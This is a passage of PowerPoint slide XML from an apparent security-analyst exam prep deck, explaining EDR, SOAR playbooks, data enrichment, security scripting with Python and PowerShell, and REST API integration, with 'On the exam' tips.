              <a:t>–  Microsoft 365</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Google G Suite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130</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DLP AND ENDPOINT DETECTION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Endpoint Detection and Response (EDR)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Endpoint Detection and Response (EDR) is a structured extension of traditional antimalware that continuously monitors endpoints such as laptops, workstations, and mobile devices for suspicious behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its primary capabilities are to monitor endpoint activity, detect threats through behavioral analytics and indicators rather than signatures alone, and respond by isolating hosts, killing processes, or rolling back changes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The key difference from standard antimalware is that EDR records detailed telemetry and retains it for retrospective investigation and threat hunting, rather than just blocking a known-bad file at execution.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because a compromised endpoint is a common foothold for internal lateral movement, SOC analysts depend on EDR for early detection, containment, and forensic visibility across the fleet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for questions contrasting EDR (behavioral monitoring, detection, and active response with historical telemetry) against signature-based antivirus, and identifying endpoint isolation as a containment action.</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131</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DLP AND ENDPOINT DETECTION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Endpoint Detection and Response (EDR)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Part of full-scale security solution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Endpoints can be laptops, workstations, smart phones, etc. that connect to your network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  If endpoints get compromised, it can lead to internal compromise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Structured extension to traditional malware detection</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132</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DLP AND ENDPOINT DETECTION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Endpoint Detection and Response (EDR)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Primary capabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Monitor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Detect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Respond</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Main difference from standard antimalware approach</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133</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WORKFLOW AND SCRIPTING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Workflow Orchestration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Workflow orchestration is delivered through Security Orchestration, Automation, and Response (SOAR) platforms that connect disparate security tools and automate the repetitive steps of incident response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOAR executes playbooks, which are codified sequences of decisions and actions, to standardize response, reduce human error, and repeat proven processes consistently across analysts and shifts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Platforms such as Splunk SOAR (formerly Phantom) add visualization of the response flow so teams can see, audit, and refine each stage of an investigation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC this shortens mean time to respond, frees analysts from mundane triage, and ensures every incident of a given type is handled the same defensible way.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect SOAR to appear as the answer for automating and standardizing incident response via playbooks, distinct from SIEM, which aggregates and correlates log data.</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134</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WORKFLOW AND SCRIPTING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Workflow Orchestration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Security orchestration, automation, and response (SOAR) platforms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Automate common tasks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Standardize incident response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Organize flow to help catch mistakes and repeat processes easily</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: Splunk Phantom (formerly Phantom Cyber)</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135</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WORKFLOW AND SCRIPTING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Workflow Orchestration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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Playbooks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Visualization</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_8351838e99.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2348369"/>
            <a:ext cx="4937760" cy="3167102"/>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136</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WORKFLOW AND SCRIPTING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Data Enrichment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Data enrichment transforms raw log or alert data into actionable intelligence by correlating an observed indicator with additional context from other sources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The process takes a known data point and augments it with details such as threat intelligence feed results, geolocation, asset criticality, or user identity to reveal insight the raw event alone could not provide.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For example, detecting a newly opened RDP port on monitored hosts and then querying a vulnerability or threat feed that ties open RDP ports to Sarwent malware lets the SOC raise a specific alert for a potential Sarwent infection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts value enrichment because it turns isolated events into prioritized, high-confidence alerts and dramatically speeds accurate triage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam frames data enrichment as correlating an indicator with external context (threat feeds, reputation, asset data) to produce actionable, higher-fidelity alerts.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137</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WORKFLOW AND SCRIPTING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Data Enrichment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Transform raw data into actionable information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Enrichments lead to additional insights</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Process is to correlate known data with additional details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138</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WORKFLOW AND SCRIPTING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Data Enrichment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Example</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Detected newly opened RDP ports on monitored computers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Vulnerability feed queries of RDP ports being opened result in hits for Sarwent malware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Alert created for potential Sarwent malware infection</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139</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WORKFLOW AND SCRIPTING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Scripting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Scripting automates repetitive and mundane security tasks that administrators have long recognized as ripe for standardization, from log parsing to bulk configuration and data collection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Python is the dominant choice for security work because of its readability and rich libraries, and resources like the book Violent Python show how it applies directly to offensive and defensive tasks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  PowerShell is equally valuable and is now cross-platform beyond Windows, making it powerful for querying systems, automating response, and manipulating structured data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC analyst, fluency in scripting means faster, consistent, and error-resistant execution of routine work, freeing time for analysis that cannot be automated.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions identifying Python and PowerShell as the go-to scripting environments for automating repetitive analyst tasks and normalizing data.</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140</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WORKFLOW AND SCRIPTING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Scripting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Automate the repetitive stuff</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Administrators have known about the power of scripting for decades</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Great for standardizing any mundane tasks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common scripting environments:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Python</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Check out Violent Python book</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  PowerShell (not just for Microsoft Windows)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141</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API AND MALWARE SIGNATURE CREATION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Application Programming Interface (API)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An Application Programming Interface (API) is a defined contract that lets one piece of software request services or data from another without needing to know its internal workings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  APIs let analysts link their own code and scripts to third-party software, such as threat intelligence providers or security tools, and consume those capabilities with minimal integration overhead.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because so much modern tooling exposes an API, a SOC analyst who can call them can automate lookups, pull data, and orchestrate actions across an entire toolset programmatically.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam positions an API as the mechanism for programmatically consuming external services and data, underpinning automation and tool integration.</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142</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API AND MALWARE SIGNATURE CREATION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Application Programming Interface (API)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Gives the ability to reach out and consume services created by others</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Link your code and scripts to someone else’s software with minimal overhead</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143</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API AND MALWARE SIGNATURE CREATION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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Application Programming Interface (API) Integration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API integration commonly uses the Representational State Transfer (REST) method, a lightweight client/server style where an HTTP request sent to a web server is translated into a function call on the backend.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  REST is defined by architectural constraints including a client/server split, statelessness where each request carries all needed context, cacheable responses, a uniform interface, manipulation of resources through their representations, self-descriptive messages, and hypermedia as the engine of application state.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These constraints make REST APIs simple, scalable, and quick to consume, which is why they dominate security tool integrations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts integrate REST APIs to automate enrichment, submit indicators, and drive SOAR actions across cloud and on-premises services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect the exam to test REST characteristics such as statelessness and the client/server, cacheable, uniform-interface constraints as the standard for consuming remote security services.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144</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API AND MALWARE SIGNATURE CREATION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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Application Programming Interface (API) Integration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Representational State Transfer (REST) method</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Quick and easy way to consume remote services</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Create HTTP request, send to Web server; Web server translates request into a function call</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145</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API AND MALWARE SIGNATURE CREATION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Application Programming Interface (API) Integration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Representational State Transfer (REST) method</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Entire architecture is client/server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stateless</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cacheable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Uniform interface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Manipulation of resources through representations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Self-descriptive messages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Hypermedia as the engine of application state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146</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API AND MALWARE SIGNATURE CREATION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Application Programming Interface (API) Integration (3)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Layered system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Code on demand (optional)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Representational State Transfer (REST) method</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Embed in any language</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Call from command line</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  curl (character-based URL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
